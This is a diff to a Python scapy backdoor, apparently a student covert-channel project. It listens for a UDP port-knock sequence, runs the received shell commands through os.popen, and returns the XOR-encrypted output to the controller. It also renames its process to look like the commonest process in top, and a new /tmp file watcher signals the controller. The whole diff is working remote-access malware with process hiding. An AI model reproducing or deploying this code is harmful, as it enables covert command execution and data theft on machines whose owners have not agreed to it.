@@ -29,39 +29,30 @@ import re
 import socket
 import fcntl
 import struct
+import pyinotify
+import multiprocessing
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 import time
 import os
 from itertools import izip, cycle
+from threading import Timer
 
 
 ################ USER DEFINED ########################################
 INTERFACE_ = 'em1'
 
 # Ports must be the same as the client.
-KNOCK1 = 1075
-PASS1 = '$f%g'
-
-KNOCK2 = 2078
-PASS2 = '!~fD'
-
-KNOCK3 = 3079
-PASS3 = '[";-'
-
-KNOCK4 = 4067
-PASS4 = '|JG,'
-
-KNOCK5 = 5075
-PASS5 = 'cfF^'
+KNOCK = [1075, 2078, 3079, 4067, 5075]
+PASS = ['$f%g', '!~fD', '[";-', '|JG,', 'cfF^']
 
 CHANNEL = 80
 SEND_PORT = 443
 
 # Filter is tcpdump format
-FILTER = "udp and (dst port {0} or {1} or {2} or {3} or {4} or {5})".format(KNOCK1, KNOCK2, KNOCK3, KNOCK4, KNOCK5,
-                                                                            CHANNEL)
+FILTER = "udp and (dst port {0} or {1} or {2} or {3} or {4} or {5})".format(KNOCK[0], KNOCK[1],
+                                                                            KNOCK[2], KNOCK[3], KNOCK[4], CHANNEL)
 
 # Must make sure it is the same as the client
 ENCRYPTION_KEY = "zdehjk"
@@ -69,17 +60,33 @@ ENCRYPTION_KEY = "zdehjk"
 knockSequence = 0
 command = ''
 cmdLen = 0
+default_dest = '192.168.0.23'
+new_dest = ''
 
 
 
-
-def get_ip_address(ifname):
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    return socket.inet_ntoa(fcntl.ioctl(
-        s.fileno(),
-        0x8915,  # SIOCGIFADDR
-        struct.pack('256s', ifname[:15])
-    )[20:24])
+######################################################################
+##	FUNCTION:	    knock
+##
+##	INTERFACE:	   knock(dest)
+##
+##				    dest:  The destination IP
+##
+##	RETURNS:        Nothing
+##
+##	LAST MODIFIED:  November 26, 2014
+##
+##	DESIGNERS:	    Zach Smoroden & Slade Solobay
+##
+##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
+##
+##	NOTES:
+##	        Sends the knock sequence to the client for authentication.
+##
+######################################################################
+def knock(dest):
+    for i in range(0, len(KNOCK)):
+        send(IP(dst=dest) / UDP(sport=SEND_PORT, dport=(KNOCK[i] + 10)) / xor_crypt(PASS[i]), verbose=0)
 
 ######################################################################
 ##	FUNCTION:	    xor_crypt
@@ -154,14 +161,23 @@ def remoteExecute(packet):
                 print "Running Command: " + command
                 decrypt_command = os.popen(command)
                 command_result = decrypt_command.read()
-                print command_result
+                #print command_result
 
-                dest_ip = packet[0][1].src
-                print "Sending encrypted response.."
+                new_dest = packet[0][1].src
                 lines = re.split('\n', command_result)
-                for line in lines:
+
+                print "Sending encrypted response.."
+                # Send Knock Sequence
+                knock(new_dest)
+
+                # Send length of response
+                send(IP(dst=new_dest) / UDP(sport=len(lines), dport=SEND_PORT), verbose=0)
+
+                # Send data
+                for i in range(0, len(lines) - 1):
                     try:
-                        send(IP(dst=dest_ip) / UDP(sport=4444, dport=SEND_PORT) / line)
+                        send(IP(dst=new_dest) / UDP(sport=4444, dport=SEND_PORT) / xor_crypt(lines[i]), verbose=0)
+                        print 'Sent: ' + lines[i]
                     except Exception as ex:
                         print ex.message
                 knockSequence = 0
@@ -220,8 +236,8 @@ def set_proc_name(newname):
 def check_knock(port, password):
     global knockSequence
     if knockSequence == 0:
-        if port == KNOCK1:
-            if password == PASS1:
+        if port == KNOCK[knockSequence]:
+            if password == PASS[knockSequence]:
                 knockSequence += 1
                 return knockSequence
             else:
@@ -229,8 +245,8 @@ def check_knock(port, password):
         else:
             return bad_knock()
     elif knockSequence == 1:
-        if port == KNOCK2:
-            if password == PASS2:
+        if port == KNOCK[knockSequence]:
+            if password == PASS[knockSequence]:
                 knockSequence += 1
                 return knockSequence
             else:
@@ -238,8 +254,8 @@ def check_knock(port, password):
         else:
             return bad_knock()
     elif knockSequence == 2:
-        if port == KNOCK3:
-            if password == PASS3:
+        if port == KNOCK[knockSequence]:
+            if password == PASS[knockSequence]:
                 knockSequence += 1
                 return knockSequence
             else:
@@ -247,8 +263,8 @@ def check_knock(port, password):
         else:
             return bad_knock()
     elif knockSequence == 3:
-        if port == KNOCK4:
-            if password == PASS4:
+        if port == KNOCK[knockSequence]:
+            if password == PASS[knockSequence]:
                 knockSequence += 1
                 return knockSequence
             else:
@@ -256,8 +272,8 @@ def check_knock(port, password):
         else:
             return bad_knock()
     elif knockSequence == 4:
-        if port == KNOCK5:
-            if password == PASS5:
+        if port == KNOCK[knockSequence]:
+            if password == PASS[knockSequence]:
                 knockSequence += 1
                 return knockSequence
             else:
@@ -328,12 +344,54 @@ def mask_process():
     set_proc_name(command_result)
     print "The most common process for top is: {0} \n".format(command_result)
 
+
+class EventHandler(pyinotify.ProcessEvent):
+    global new_dest
+    global default_dest
+
+    def process_default(self, event):
+
+        if not new_dest:
+            knock(default_dest)
+        else:
+            knock(new_dest)
+
+
+def fileMonitor():
+    # Mask the file monitor process
+    mask_process()
+
+    wm = pyinotify.WatchManager()  # Watch Manager
+    notifier = pyinotify.ThreadedNotifier(wm, EventHandler())
+    notifier.start()
+
+    wdd = wm.add_watch('/tmp', pyinotify.ALL_EVENTS, rec=True, auto_add=True)
+
+def reset_ip_thread():
+    global new_dest
+
+    Timer(180.0, reset_ip_thread).start()
+    new_dest = ''
+    
 ###### START OF SCRIPT #######
 # To show the user what it is listening for.
 print FILTER
 
-# Mask the processes.
-mask_process()
+try:
+    # Mask the processes.
+    mask_process()
 
-# Start sniffing for packets
-sniff(filter=FILTER, prn=remoteExecute)
+    # Start the thread to reset the IP
+    reset_ip_thread()
+
+    # Start the file watcher
+    filewatch_process = multiprocessing.Process(target=fileMonitor)
+
+    # Start sniffing for packets
+    sniff(filter=FILTER, prn=remoteExecute)
+
+except KeyboardInterrupt:
+    sys.exit(0)
+except Exception as ex:
+    print ex.message
+    sys.exit(1)
